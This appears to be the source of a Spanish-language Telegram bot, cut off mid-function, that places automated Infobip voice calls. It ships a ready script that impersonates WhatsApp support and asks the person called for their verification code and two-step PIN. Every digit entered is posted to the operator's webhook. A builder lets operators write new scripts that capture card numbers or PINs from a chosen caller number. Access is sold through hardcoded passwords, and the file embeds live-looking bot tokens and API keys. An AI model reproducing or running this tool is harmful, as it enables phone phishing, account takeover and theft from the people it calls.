"use strict";

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const https = require("follow-redirects").https;
const fs = require("fs");
const path = require("path");

// =========================
// CONFIGURACIÓN
// =========================
const TELEGRAM_BOT_TOKEN = "7521128407:AAH2E4SKkAgKiXrkIReQwufyLoQTcRp4bvk";
const PORT = process.env.PORT || 3000;
const DEFAULT_API_KEY = "App e3daefcc80560f5b41fbaea5f57cf55d-37367689-0e5a-47ad-bf35-7f11679eb55d";
const INFOBIP_BASE_HOST = "pdl8re.api.infobip.com";
const WEBHOOK = "https://botllamadas.onrender.com/infobip-webhook";
const SCRIPTS_DIR = path.join(__dirname, "scripts");

if (!fs.existsSync(SCRIPTS_DIR)) fs.mkdirSync(SCRIPTS_DIR, { recursive: true });

// =========================
// ALMACENAMIENTO
// =========================
const authenticatedUsers = {};
const awaitingInput = {};
const callRequests = {};
const callRequestsByNumber = {};
const answeredCalls = new Set();

// =========================
// GUIONES EN DISCO
// =========================
function getScriptsFile(chatId) {
  return path.join(SCRIPTS_DIR, `${chatId}.json`);
}
function loadScripts(chatId) {
  try {
    if (!fs.existsSync(getScriptsFile(chatId))) return {};
    return JSON.parse(fs.readFileSync(getScriptsFile(chatId), "utf8"));
  } catch { return {}; }
}
function saveScript(chatId, name, steps) {
  const scripts = loadScripts(chatId);
  scripts[name] = { name, steps, updatedAt: new Date().toISOString() };
  fs.writeFileSync(getScriptsFile(chatId), JSON.stringify(scripts, null, 2), "utf8");
}
function deleteScript(chatId, name) {
  const scripts = loadScripts(chatId);
  delete scripts[name];
  fs.writeFileSync(getScriptsFile(chatId), JSON.stringify(scripts, null, 2), "utf8");
}

// =========================
// HELPERS
// =========================
function formatNumber(num) {
  if (!num || num === "?") return "+?";
  const s = String(num);
  return s.startsWith("+") ? s : "+" + s;
}
function getUserApiKey(chatId) {
  const user = authenticatedUsers[chatId];
  if (user && user.admin) return DEFAULT_API_KEY;
  if (user && user.apiKey) return user.apiKey.startsWith("App ") ? user.apiKey : "App " + user.apiKey;
  return null;
}
function getInfobipHost(chatId) {
  const user = authenticatedUsers[chatId];
  if (user && user.infobipHost) return user.infobipHost;
  return INFOBIP_BASE_HOST;
}

// =========================
// VISTA PREVIA DEL GUIÓN
// =========================
function previewSteps(steps) {
  if (!steps || steps.length === 0) return "_(aún sin pasos)_";
  let txt = "";
  steps.forEach((step, i) => {
    if (step.type === "say") {
      txt += `${i + 1}. 🗣️ Dice: "${step.text.substring(0, 60)}${step.text.length > 60 ? "..." : ""}"\n`;
    } else if (step.type === "collect") {
      txt += `${i + 1}. 🔢 Captura *${step.label}* (${step.digits} dígito${step.digits > 1 ? "s" : ""})\n`;
      txt += `   _Texto: "${step.text.substring(0, 50)}${step.text.length > 50 ? "..." : ""}"_\n`;
    } else if (step.type === "menu") {
      txt += `${i + 1}. 🔀 Menú: "${step.text.substring(0, 50)}${step.text.length > 50 ? "..." : ""}"\n`;
      step.options.forEach(o => {
        txt += `   • Tecla ${o.key} → ${o.label}\n`;
        if (o.steps && o.steps.length > 0) {
          o.steps.forEach((s, si) => {
            if (s.type === "say") txt += `     ${si + 1}. 🗣️ "${s.text.substring(0, 40)}..."\n`;
            else if (s.type === "collect") txt += `     ${si + 1}. 🔢 Captura *${s.label}*\n`;
            else if (s.type === "hangup") txt += `     ${si + 1}. 🔚 Colgar\n`;
          });
        }
      });
    } else if (step.type === "pause") {
      txt += `${i + 1}. ⏸️ Pausa de ${step.duration / 1000}s\n`;
    } else if (step.type === "hangup") {
      txt += `${i + 1}. 🔚 Colgar\n`;
    }
  });
  return txt;
}

// =========================
// GUIÓN WHATSAPP POR DEFECTO
// =========================
const WHATSAPP_STEPS = [
  {
    type: "menu",
    varName: "initialOption",
    label: "opción inicial",
    text: "Hola. Este es un comunicado importante desde el soporte técnico de WhatsApp. Hemos detectado actividades inusuales en su cuenta. Si usted realizó una solicitud en un nuevo dispositivo, presione 1. De lo contrario, presione 2.",
    timeout: 5,
    options: [
      { key: "1", label: "confirmar solicitud", steps: [] },
      { key: "2", label: "reportar actividad no autorizada", steps: [] }
    ]
  },
  {
    type: "collect",
    varName: "verificationCode",
    label: "código de verificación",
    text: "Le hemos enviado un código de verificación de 6 dígitos a su WhatsApp. Por favor ingréselo ahora.",
    digits: 6,
    timeout: 10
  },
  {
    type: "menu",
    varName: "twoStepOption",
    label: "opción dos pasos",
    text: "Gracias. ¿Su cuenta tiene verificación de dos pasos activada? Presione 1 si la tiene. Presione 2 si no.",
    timeout: 5,
    options: [
      {
        key: "1", label: "tiene verificación de dos pasos", steps: [
          { type: "collect", varName: "twoStepCode", label: "código dos pasos", text: "Por favor ingrese su PIN de verificación de dos pasos de 6 dígitos.", digits: 6, timeout: 10 },
          { type: "say", text: "Código de dos pasos recibido. Gracias por su verificación." }
        ]
      },
      {
        key: "2", label: "no tiene verificación de dos pasos", steps: [
          { type: "collect", varName: "newTwoStepPin", label: "nuevo PIN", text: "Configure su nuevo PIN de seguridad de 6 dígitos.", digits: 6, timeout: 10 },
          { type: "say", text: "Nuevo PIN configurado correctamente." }
        ]
      }
    ]
  }
];

// =========================
// CONSTRUIR SCRIPT IVR
// =========================
function notifyEvent(type, from, to, extra = {}) {
  return {
    request: WEBHOOK,
    options: { method: "POST", headers: { "Content-Type": "application/json" }, body: { type, from, to, ...extra } }
  };
}

function buildIVRScript(steps, fromNumber, toNumber) {
  const vo = { language: "es" };
  const script = [notifyEvent("CALL_ANSWERED", fromNumber, toNumber)];

  function processSteps(stepList) {
    const out = [];
    for (const step of stepList) {
      if (step.type === "say") {
        out.push({ say: step.text, options: vo });

      } else if (step.type === "collect") {
        out.push({ say: step.text, options: vo });
        out.push({ collectInto: step.varName, options: { maxInputLength: step.digits, timeout: step.timeout, sendToReports: "ALWAYS" } });
        out.push(notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: step.varName, label: step.label, value: `\${${step.varName}}` }));

      } else if (step.type === "menu") {
        const validKeys = step.options.map(o => `'${o.key}'`);
        const whileCond = validKeys.map(k => `\${${step.varName} != ${k}}`).join(" && ");
        const menuText = step.text + " " + step.options.map(o => `Presione ${o.key} para ${o.label}.`).join(" ");
        out.push({
          repeat: [
            { say: menuText, options: vo },
            { collectInto: step.varName, options: { maxInputLength: 1, timeout: step.timeout || 5, sendToReports: "ALWAYS" } }
          ],
          while: whileCond
        });
        out.push(notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: step.varName, label: step.label || step.varName, value: `\${${step.varName}}` }));
        for (const opt of step.options) {
          if (opt.steps && opt.steps.length > 0) {
            out.push({ if: `\${${step.varName} == '${opt.key}'}`, then: processSteps(opt.steps) });
          }
        }

      } else if (step.type === "pause") {
        out.push({ pause: { duration: step.duration } });

      } else if (step.type === "hangup") {
        out.push("hangup");
      }
    }
    return out;
  }

  script.push(...processSteps(steps));
  script.push(notifyEvent("CALL_FINISHED", fromNumber, toNumber));
  script.push("hangup");
  return script;
}

// =========================
// MENÚ PRINCIPAL
// =========================
function sendMainMenu(ctx) {
  ctx.replyWithHTML(
    "<b>Menú principal</b> 🌟",
    Markup.keyboard([
      ["📞 Realizar llamada", "📋 Mis guiones"],
      ["🔧 Cambiar API"]
    ]).resize()
  );
}

// =========================
// BOT
// =========================
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

bot.use((ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next();
  const chatId = ctx.chat.id;
  const txt = ctx.message.text;
  if (txt.startsWith("/login") || txt.startsWith("/start")) return next();

  if (!authenticatedUsers[chatId] || !authenticatedUsers[chatId].authenticated) {
    const pw = txt.trim();
    if (pw === "Mortadela1$") {
      authenticatedUsers[chatId] = { authenticated: true, unlimited: true, admin: true };
      ctx.replyWithHTML("<b>¡Bienvenido Administrador!</b> 😎");
      sendMainMenu(ctx); return;
    } else if (pw === "PapaHelado4") {
      let exp = new Date(`${new Date().getFullYear()}-03-18T23:59:59`);
      if (new Date() > exp) exp = new Date(`${new Date().getFullYear() + 1}-03-18T23:59:59`);
      authenticatedUsers[chatId] = { authenticated: true, unlimited: false, admin: false, expiresAt: exp };
      ctx.replyWithHTML("<b>¡Bienvenido!</b> ⏳");
      sendMainMenu(ctx); return;
    } else if (pw === "UsuarioExitoso222") {
      let exp = new Date(`${new Date().getFullYear()}-03-18T23:59:59`);
      if (new Date() > exp) exp = new Date(`${new Date().getFullYear() + 1}-03-18T23:59:59`);
      authenticatedUsers[chatId] = { authenticated: true, unlimited: false, admin: false, expiresAt: exp, apiKey: "App beed66c4d04eeacdb896948a5fd0f3e9-98ce2848-a6fc-47b7-8e5e-87e575996553", infobipHost: "l2ljdw.api.infobip.com" };
      ctx.replyWithHTML("<b>¡Bienvenido Usuario Exitoso!</b> 🌍");
      sendMainMenu(ctx); return;
    } else {
      ctx.reply("❌ Contraseña incorrecta."); return;
    }
  } else if (!authenticatedUsers[chatId].unlimited) {
    if (new Date() > authenticatedUsers[chatId].expiresAt) {
      ctx.reply("⚠️ Tu acceso expiró. Vuelve a autenticarte.");
      authenticatedUsers[chatId] = { authenticated: false }; return;
    }
  }
  return next();
});

bot.command("login", (ctx) => ctx.reply("🔒 Ingresa la contraseña:"));
bot.start((ctx) => {
  const chatId = ctx.chat.id;
  if (!authenticatedUsers[chatId] || !authenticatedUsers[chatId].authenticated) {
    ctx.reply("🔑 Ingresa la contraseña:");
  } else { sendMainMenu(ctx); }
});

bot.hears("🔧 Cambiar API", (ctx) => {
  awaitingInput[ctx.chat.id] = { type: "change_api" };
  ctx.reply("📝 Envíame la nueva API Key de Infobip:");
});

// REALIZAR LLAMADA
bot.hears("📞 Realizar llamada", (ctx) => {
  const chatId = ctx.chat.id;
  if (!getUserApiKey(chatId)) {
    ctx.reply("⚠️ Primero configura tu API Key con 🔧 Cambiar API.");
    return;
  }
  const scripts = loadScripts(chatId);
  const names = Object.keys(scripts);
  const buttons = [["📱 Guión WhatsApp (ya viene listo)"]];
  names.forEach(n => buttons.push([`📄 ${n}`]));
  buttons.push(["➕ Crear un guión nuevo"]);
  buttons.push(["❌ Cancelar"]);
  awaitingInput[chatId] = { type: "choose_script" };
  ctx.reply("¿Con qué guión quieres llamar?", Markup.keyboard(buttons).resize());
});

// MIS GUIONES
bot.hears("📋 Mis guiones", (ctx) => {
  const chatId = ctx.chat.id;
  const scripts = loadScripts(chatId);
  const names = Object.keys(scripts);
  if (names.length === 0) {
    ctx.reply("No tienes guiones guardados aún.\n\nUsa 📞 Realizar llamada → ➕ Crear un guión nuevo para crear uno.");
    return;
  }
  const buttons = names.map(n => [`📄 ${n}`]);
  buttons.push(["🔙 Volver"]);
  awaitingInput[chatId] = { type: "manage_script" };
  ctx.reply("📋 Tus guiones guardados. ¿Cuál quieres ver?", Markup.keyboard(buttons).resize());
});

// PROCESADOR PRINCIPAL
bot.on("text", (ctx, next) => {
  const chatId = ctx.chat.id;
  const input = ctx.message.text.trim();
  if (!awaitingInput[chatId]) return next();
  const state = awaitingInput[chatId];

  // CANCELAR / VOLVER
  if (input === "❌ Cancelar" || input === "🔙 Volver") {
    delete awaitingInput[chatId];
    sendMainMenu(ctx); return;
  }

  // CAMBIAR API
  if (state.type === "change_api") {
    authenticatedUsers[chatId].apiKey = input;
    ctx.replyWithHTML(`✅ API Key actualizada: <code>${input}</code>`);
    delete awaitingInput[chatId];
    sendMainMenu(ctx); return;
  }

  // ELEGIR GUIÓN
  if (state.type === "choose_script") {
    if (input === "📱 Guión WhatsApp (ya viene listo)") {
      awaitingInput[chatId] = { type: "call_from", steps: WHATSAPP_STEPS, scriptName: "WhatsApp" };
      ctx.reply("📞 ¿Desde qué número vas a llamar?\n(con código de país, ej: +12223334444)", Markup.removeKeyboard()); return;
    }
    if (input === "➕ Crear un guión nuevo") {
      startBuilder(ctx, chatId); return;
    }
    if (input.startsWith("📄 ")) {
      const name = input.replace("📄 ", "");
      const scripts = loadScripts(chatId);
      if (scripts[name]) {
        awaitingInput[chatId] = { type: "call_from", steps: scripts[name].steps, scriptName: name };
        ctx.reply("📞 ¿Desde qué número vas a llamar?\n(con código de país, ej: +12223334444)", Markup.removeKeyboard()); return;
      }
    }
    return;
  }

  // GESTIONAR GUIÓN GUARDADO
  if (state.type === "manage_script") {
    if (input.startsWith("📄 ")) {
      const name = input.replace("📄 ", "");
      const scripts = loadScripts(chatId);
      if (scripts[name]) {
        awaitingInput[chatId] = { type: "script_options", scriptName: name };
        const preview = previewSteps(scripts[name].steps);
        ctx.reply(`📄 *Guión: ${name}*\n\n${preview}`, { parse_mode: "Markdown" });
        ctx.reply("¿Qué quieres hacer con este guión?", Markup.keyboard([
          ["📞 Llamar con este guión", "🎭 Simularlo primero"],
          ["🗑️ Eliminar", "🔙 Volver"]
        ]).resize()); return;
      }
    }
    return;
  }

  // OPCIONES DE GUIÓN
  if (state.type === "script_options") {
    const { scriptName } = state;
    const scripts = loadScripts(chatId);
    if (input === "📞 Llamar con este guión") {
      awaitingInput[chatId] = { type: "call_from", steps: scripts[scriptName].steps, scriptName };
      ctx.reply("📞 ¿Desde qué número vas a llamar?\n(con código de país, ej: +12223334444)", Markup.removeKeyboard()); return;
    }
    if (input === "🎭 Simularlo primero") {
      awaitingInput[chatId] = { type: "simulating", steps: JSON.parse(JSON.stringify(scripts[scriptName].steps)), stepIndex: 0, vars: {}, waitingInput: false };
      ctx.reply(`🎭 *Simulación de "${scriptName}"*\n\nVas a escribir los números como si fueras la persona que recibe la llamada.\n\nPresiona cualquier número para empezar 👇`, { parse_mode: "Markdown" });
      runSim(ctx, chatId); return;
    }
    if (input === "🗑️ Eliminar") {
      awaitingInput[chatId] = { type: "confirm_delete", scriptName };
      ctx.reply(`⚠️ ¿Seguro que quieres eliminar "${scriptName}"?`, Markup.keyboard([["✅ Sí, eliminar", "❌ No, cancelar"]]).resize()); return;
    }
    return;
  }

  // CONFIRMAR ELIMINACIÓN
  if (state.type === "confirm_delete") {
    if (input === "✅ Sí, eliminar") {
      deleteScript(chatId, state.scriptName);
      ctx.reply(`🗑️ Guión "${state.scriptName}" eliminado.`);
      delete awaitingInput[chatId]; sendMainMenu(ctx); return;
    }
    delete awaitingInput[chatId]; sendMainMenu(ctx); return;
  }

  // NÚMERO ORIGEN
  if (state.type === "call_from") {
    awaitingInput[chatId] = { ...state, type: "call_to", fromNumber: input };
    ctx.reply("📲 ¿A qué número quieres llamar?\n(con código de país, ej: +573001234567)"); return;
  }

  // NÚMERO DESTINO
  if (state.type === "call_to") {
    const { fromNumber, steps, scriptName } = state;
    ctx.replyWithHTML(`📞 Llamando a <b>${input}</b> desde <b>${fromNumber}</b>...\nGuión: <b>${scriptName}</b>`);
    initiateCallWithSteps(chatId, input, fromNumber, steps, scriptName);
    delete awaitingInput[chatId]; return;
  }

  // CONSTRUCTOR
  if (state.type && state.type.startsWith("b_")) {
    handleBuilder(ctx, chatId, input, state); return;
  }

  // SIMULACIÓN
  if (state.type === "simulating") {
    handleSim(ctx, chatId, input, state); return;
  }

  return next();
});

// =========================
// CONSTRUCTOR — MUY SIMPLE
// =========================
function startBuilder(ctx, chatId, replaceName = null) {
  if (replaceName) {
    awaitingInput[chatId] = { type: "b_add_step", name: replaceName, steps: [] };
    showBuilderMenu(ctx, []);
  } else {
    awaitingInput[chatId] = { type: "b_name", steps: [] };
    ctx.reply("🛠️ Vamos a crear tu guión.\n\n¿Cómo quieres llamarlo? (ej: Guión Banco, Guión Seguro)", Markup.removeKeyboard());
  }
}

function showBuilderMenu(ctx, steps, extra = "") {
  const preview = previewSteps(steps);
  const msg = `${extra ? extra + "\n\n" : ""}📋 *Tu guión hasta ahora:*\n${preview}\n\n¿Qué quieres agregar?`;
  ctx.reply(msg, {
    parse_mode: "Markdown",
    ...Markup.keyboard([
      ["🗣️ Agregar mensaje de voz"],
      ["🔢 Pedir que presionen dígitos"],
      ["🔀 Crear menú (presione 1, 2...)"],
      ["⏸️ Agregar pausa"],
      ["↩️ Quitar último paso"],
      ["✅ Listo, guardar guión"],
      ["❌ Cancelar"]
    ]).resize()
  });
}

function handleBuilder(ctx, chatId, input, state) {

  // NOMBRE
  if (state.type === "b_name") {
    const scripts = loadScripts(chatId);
    if (scripts[input]) {
      ctx.reply(`Ya tienes un guión llamado "${input}". Escribe otro nombre:`); return;
    }
    awaitingInput[chatId] = { type: "b_add_step", name: input, steps: [] };
    ctx.reply(`✅ Nombre: *${input}*`, { parse_mode: "Markdown" });
    showBuilderMenu(ctx, []); return;
  }

  // MENÚ PRINCIPAL DEL CONSTRUCTOR
  if (state.type === "b_add_step") {

    if (input === "↩️ Quitar último paso") {
      if (state.steps.length === 0) { ctx.reply("No hay pasos que quitar."); showBuilderMenu(ctx, state.steps); return; }
      const removed = state.steps.pop();
      const label = removed.type === "say" ? "🗣️ Mensaje" : removed.type === "collect" ? "🔢 Captura" : removed.type === "menu" ? "🔀 Menú" : removed.type === "pause" ? "⏸️ Pausa" : "🔚 Colgar";
      showBuilderMenu(ctx, state.steps, `↩️ Se quitó: ${label}`); return;
    }

    if (input === "✅ Listo, guardar guión") {
      if (state.steps.length === 0) { ctx.reply("⚠️ Agrega al menos un paso antes de guardar."); return; }
      saveScript(chatId, state.name, state.steps);
      const preview = previewSteps(state.steps);
      ctx.reply(`✅ *Guión "${state.name}" guardado.*\n\n${preview}`, { parse_mode: "Markdown" });
      delete awaitingInput[chatId]; sendMainMenu(ctx); return;
    }

    if (input === "🗣️ Agregar mensaje de voz") {
      awaitingInput[chatId] = { ...state, type: "b_say" };
      ctx.reply("🗣️ Escribe el texto que va a decir la llamada:", Markup.removeKeyboard()); return;
    }

    if (input === "🔢 Pedir que presionen dígitos") {
      awaitingInput[chatId] = { ...state, type: "b_collect_label" };
      ctx.reply("🔢 ¿Cómo llamarás a este dato que vas a capturar?\n(ej: código de verificación, número de tarjeta, PIN)", Markup.removeKeyboard()); return;
    }

    if (input === "🔀 Crear menú (presione 1, 2...)") {
      awaitingInput[chatId] = { ...state, type: "b_menu_text" };
      ctx.reply("🔀 Escribe el texto introductorio del menú.\n(ej: Para continuar presione 1. Para cancelar presione 2.)\n\n💡 No necesitas escribir las instrucciones de cada tecla, eso lo configuramos después.", Markup.removeKeyboard()); return;
    }

    if (input === "⏸️ Agregar pausa") {
      awaitingInput[chatId] = { ...state, type: "b_pause" };
      ctx.reply("⏸️ ¿Cuántos segundos de silencio quieres?\n(ej: 1, 2, 3)", Markup.removeKeyboard()); return;
    }

    return;
  }

  // SAY
  if (state.type === "b_say") {
    state.steps.push({ type: "say", text: input });
    awaitingInput[chatId] = { ...state, type: "b_add_step" };
    showBuilderMenu(ctx, state.steps, `✅ Mensaje agregado.`); return;
  }

  // COLLECT — NOMBRE DEL DATO
  if (state.type === "b_collect_label") {
    awaitingInput[chatId] = { ...state, type: "b_collect_text", collectLabel: input };
    ctx.reply(`🔢 ¿Qué texto va a decir la llamada antes de que el usuario escriba el "${input}"?\n(ej: Por favor ingrese su ${input} de 6 dígitos.)`, Markup.removeKeyboard()); return;
  }

  // COLLECT — TEXTO
  if (state.type === "b_collect_text") {
    awaitingInput[chatId] = { ...state, type: "b_collect_digits", collectText: input };
    ctx.reply(`🔢 ¿Cuántos dígitos tiene el "${state.collectLabel}"?\n(ej: 1, 4, 6, 10)`, Markup.removeKeyboard()); return;
  }

  // COLLECT — DÍGITOS
  if (state.type === "b_collect_digits") {
    const digits = parseInt(input);
    if (!digits || digits < 1 || digits > 20) { ctx.reply("Por favor escribe un número entre 1 y 20."); return; }
    awaitingInput[chatId] = { ...state, type: "b_collect_timeout", collectDigits: digits };
    ctx.reply(`⏳ ¿Cuántos segundos esperas a que el usuario termine de ingresar el "${state.collectLabel}"?\n(ej: 10 para un código corto, 15 para uno largo)`, Markup.removeKeyboard()); return;
  }

  // COLLECT — TIMEOUT
  if (state.type === "b_collect_timeout") {
    const timeout = parseInt(input);
    if (!timeout || timeout < 3 || timeout > 60) { ctx.reply("Por favor escribe un número entre 3 y 60 segundos."); return; }
    const varName = "dato_" + state.collectLabel.replace(/[^a-zA-Z0-9]/g, "_").substring(0, 20) + "_" + Date.now().toString().slice(-4);
    state.steps.push({ type: "collect", varName, label: state.collectLabel, text: state.collectText, digits: state.collectDigits, timeout });
    awaitingInput[chatId] = { ...state, type: "b_add_step" };
    showBuilderMenu(ctx, state.steps, `✅ Captura de *${state.collectLabel}* agregada.`); return;
  }

  // MENÚ — TEXTO INTRO
  if (state.type === "b_menu_text") {
    awaitingInput[chatId] = { ...state, type: "b_menu_num_opts", menuText: input };
    ctx.reply("🔀 ¿Cuántas opciones tendrá el menú?\n(ej: 2, 3, 4)", Markup.removeKeyboard()); return;
  }

  // MENÚ — CANTIDAD DE OPCIONES
  if (state.type === "b_menu_num_opts") {
    const n = parseInt(input);
    if (!n || n < 2 || n > 9) { ctx.reply("Por favor escribe un número entre 2 y 9."); return; }
    awaitingInput[chatId] = { ...state, type: "b_menu_opt_key", menuNumOpts: n, menuOpts: [], currentOpt: 1 };
    ctx.reply(`🔀 Opción 1 de ${n}:\n¿Qué tecla debe presionar el usuario? (escribe solo el número, ej: 1)`, Markup.removeKeyboard()); return;
  }

  // MENÚ — TECLA DE CADA OPCIÓN
  if (state.type === "b_menu_opt_key") {
    if (!/^\d$/.test(input)) { ctx.reply("Escribe solo un dígito del 0 al 9."); return; }
    if (state.menuOpts.some(o => o.key === input)) { ctx.reply(`La tecla ${input} ya está usada. Elige otra.`); return; }
    awaitingInput[chatId] = { ...state, type: "b_menu_opt_label", currentKey: input };
    ctx.reply(`✅ Tecla: ${input}\n¿Qué hace esta opción? Descríbela brevemente.\n(ej: hablar con soporte, cancelar suscripción)`, Markup.removeKeyboard()); return;
  }

  // MENÚ — ETIQUETA DE CADA OPCIÓN
  if (state.type === "b_menu_opt_label") {
    const opt = { key: state.currentKey, label: input, steps: [] };
    const newOpts = [...(state.menuOpts || []), opt];
    if (newOpts.length < state.menuNumOpts) {
      awaitingInput[chatId] = { ...state, type: "b_menu_opt_key", menuOpts: newOpts, currentOpt: state.currentOpt + 1 };
      ctx.reply(`✅ Opción "${input}" (tecla ${state.currentKey}) agregada.\n\nOpción ${state.currentOpt + 1} de ${state.menuNumOpts}:\n¿Qué tecla?`, Markup.removeKeyboard());
    } else {
      // Todas las opciones definidas — preguntar si quiere acciones por opción
      awaitingInput[chatId] = { ...state, type: "b_menu_branches_ask", menuOpts: newOpts };
      const summary = newOpts.map(o => `• Tecla ${o.key} → ${o.label}`).join("\n");
      ctx.reply(`✅ Opciones del menú:\n${summary}\n\n¿Quieres que cuando el usuario presione cada tecla pase algo específico?\n(ej: si presiona 1 pedir código, si presiona 2 decir un mensaje diferente)`, Markup.keyboard([["✅ Sí, configurar acciones"], ["❌ No, el menú solo captura la tecla"]]).resize());
    }
    return;
  }

  // MENÚ — ¿RAMAS?
  if (state.type === "b_menu_branches_ask") {
    if (input === "✅ Sí, configurar acciones") {
      awaitingInput[chatId] = { ...state, type: "b_menu_branch", branchIdx: 0, branchSteps: [] };
      const opt = state.menuOpts[0];
      ctx.reply(`📌 Acciones cuando presionen *${opt.key}* (${opt.label}):\n¿Qué quieres que pase?`, {
        parse_mode: "Markdown",
        ...Markup.keyboard([
          ["🗣️ Decir un mensaje"],
          ["🔢 Pedir que ingresen dígitos"],
          ["🔚 Colgar"],
          ["✅ Listo con esta opción"]
        ]).resize()
      }); return;
    }
    // Sin ramas
    finishMenu(ctx, chatId, state); return;
  }

  // MENÚ — PASOS DE CADA RAMA
  if (state.type === "b_menu_branch") {
    const opt = state.menuOpts[state.branchIdx];

    if (input === "✅ Listo con esta opción") {
      state.menuOpts[state.branchIdx].steps = state.branchSteps || [];
      const nextIdx = state.branchIdx + 1;
      if (nextIdx < state.menuOpts.length) {
        const nextOpt = state.menuOpts[nextIdx];
        awaitingInput[chatId] = { ...state, branchIdx: nextIdx, branchSteps: [] };
        ctx.reply(`📌 Acciones cuando presionen *${nextOpt.key}* (${nextOpt.label}):`, {
          parse_mode: "Markdown",
          ...Markup.keyboard([
            ["🗣️ Decir un mensaje"],
            ["🔢 Pedir que ingresen dígitos"],
            ["🔚 Colgar"],
            ["✅ Listo con esta opción"]
          ]).resize()
        });
      } else {
        finishMenu(ctx, chatId, state);
      }
      return;
    }

    if (input === "🗣️ Decir un mensaje") {
      awaitingInput[chatId] = { ...state, type: "b_branch_say" };
      ctx.reply("🗣️ Escribe el mensaje:", Markup.removeKeyboard()); return;
    }
    if (input === "🔢 Pedir que ingresen dígitos") {
      awaitingInput[chatId] = { ...state, type: "b_branch_collect_label" };
      ctx.reply("🔢 ¿Cómo llamarás a este dato?\n(ej: código, PIN, número)", Markup.removeKeyboard()); return;
    }
    if (input === "🔚 Colgar") {
      if (!state.branchSteps) state.branchSteps = [];
      state.branchSteps.push({ type: "hangup" });
      ctx.reply("✅ Se agregará colgar. ¿Algo más para esta opción?", Markup.keyboard([
        ["🗣️ Decir un mensaje"], ["🔢 Pedir que ingresen dígitos"],
        ["🔚 Colgar"], ["✅ Listo con esta opción"]
      ]).resize()); return;
    }
    return;
  }

  // RAMA — SAY
  if (state.type === "b_branch_say") {
    if (!state.branchSteps) state.branchSteps = [];
    state.branchSteps.push({ type: "say", text: input });
    awaitingInput[chatId] = { ...state, type: "b_menu_branch" };
    ctx.reply(`✅ Mensaje agregado. ¿Algo más para esta opción?`, Markup.keyboard([
      ["🗣️ Decir un mensaje"], ["🔢 Pedir que ingresen dígitos"],
      ["🔚 Colgar"], ["✅ Listo con esta opción"]
    ]).resize()); return;
  }

  // RAMA — COLLECT LABEL
  if (state.type === "b_branch_collect_label") {
    awaitingInput[chatId] = { ...state, type: "b_branch_collect_text", branchCollectLabel: input };
    ctx.reply(`🔢 ¿Qué texto dice antes de que ingresen el "${input}"?`, Markup.removeKeyboard()); return;
  }

  // RAMA — COLLECT TEXT
  if (state.type === "b_branch_collect_text") {
    awaitingInput[chatId] = { ...state, type: "b_branch_collect_digits", branchCollectText: input };
    ctx.reply(`🔢 ¿Cuántos dígitos tiene el "${state.branchCollectLabel}"?`, Markup.removeKeyboard()); return;
  }

  // RAMA — COLLECT DIGITS
  if (state.type === "b_branch_collect_digits") {
    const digits = parseInt(input);
    if (!digits || digits < 1 || digits > 20) { ctx.reply("Escribe un número entre 1 y 20."); return; }
    if (!state.branchSteps) state.branchSteps = [];
    const varName = "dato_" + state.branchCollectLabel.replace(/[^a-zA-Z0-9]/g, "_").substring(0, 20) + "_" + Date.now().toString().slice(-4);
    state.branchSteps.push({ type: "collect", varName, label: state.branchCollectLabel, text: state.branchCollectText, digits, timeout: 15 });
    awaitingInput[chatId] = { ...state, type: "b_menu_branch" };
    ctx.reply(`✅ Captura de *${state.branchCollectLabel}* agregada. ¿Algo más?`, {
      parse_mode: "Markdown",
      ...Markup.keyboard([
        ["🗣️ Decir un mensaje"], ["🔢 Pedir que ingresen dígitos"],
        ["🔚 Colgar"], ["✅ Listo con esta opción"]
      ]).resize()
    }); return;
  }

  // PAUSA
  if (state.type === "b_pause") {
    const secs = parseInt(input);
    if (!secs || secs < 1 || secs > 30) { ctx.reply("Escribe un número entre 1 y 30."); return; }
    state.steps.push({ type: "pause", duration: secs * 1000 });
    awaitingInput[chatId] = { ...state, type: "b_add_step" };
    showBuilderMenu(ctx, state.steps, `✅ Pausa de ${secs}s agregada.`); return;
  }
}

function finishMenu(ctx, chatId, state) {
  const varName = "menu_" + Date.now().toString().slice(-6);
  const menuStep = { type: "menu", varName, label: state.menuText.substring(0, 30), text: state.menuText, timeout: 5, options: state.menuOpts };
  state.steps.push(menuStep);
  awaitingInput[chatId] = { ...state, type: "b_add_step" };
  showBuilderMenu(ctx, state.steps, `✅ Menú con ${state.menuOpts.length} opciones agregado.`);
}

// =========================
// SIMULACIÓN INTERACTIVA
// =========================
function runSim(ctx, chatId) {
  const state = awaitingInput[chatId];
  if (!state || state.type !== "simulating") return;

  const steps = state.steps;
  if (state.stepIndex >= steps.length) {
    ctx.reply("🏁 *Fin de la simulación.*\n\n¿Qué quieres hacer ahora?", {
      parse_mode: "Markdown",
      ...Markup.keyboard([["📞 Llamar con este guión", "🔙 Volver"]]).resize()
    });
    return;
  }

  const step = steps[state.stepIndex];

  if (step.type === "say") {
    ctx.reply(`🗣️ *Dice:*\n"${step.text}"`, { parse_mode: "Markdown" });
    awaitingInput[chatId] = { ...state, stepIndex: state.stepIndex + 1 };
    setTimeout(() => runSim(ctx, chatId), 400);

  } else if (step.type === "collect") {
    ctx.reply(`🗣️ *Dice:*\n"${step.text}"\n\n🔢 _(Escribe el ${step.label} — ${step.digits} dígito${step.digits > 1 ? "s" : ""})_`, { parse_mode: "Markdown" });
    awaitingInput[chatId] = { ...state, waitingInput: true, currentStep: step };

  } else if (step.type === "menu") {
    const opts = step.options.map(o => `• Tecla *${o.key}* → ${o.label}`).join("\n");
    ctx.reply(`🗣️ *Dice:*\n"${step.text}"\n\n${opts}\n\n🔢 _(Escribe la tecla que presionarías)_`, { parse_mode: "Markdown" });
    awaitingInput[chatId] = { ...state, waitingInput: true, currentStep: step };

  } else if (step.type === "pause") {
    const s = step.duration / 1000;
    ctx.reply(`⏸️ _(Pausa de ${s} segundo${s > 1 ? "s" : ""})_`, { parse_mode: "Markdown" });
    awaitingInput[chatId] = { ...state, stepIndex: state.stepIndex + 1 };
    setTimeout(() => runSim(ctx, chatId), step.duration);

  } else if (step.type === "hangup") {
    ctx.reply("🔚 _(Cuelga)_", { parse_mode: "Markdown" });
    awaitingInput[chatId] = { ...state, stepIndex: state.stepIndex + 1 };
    setTimeout(() => runSim(ctx, chatId), 400);
  }
}

function handleSim(ctx, chatId, input, state) {
  if (!state.waitingInput) return;
  const step = state.currentStep;

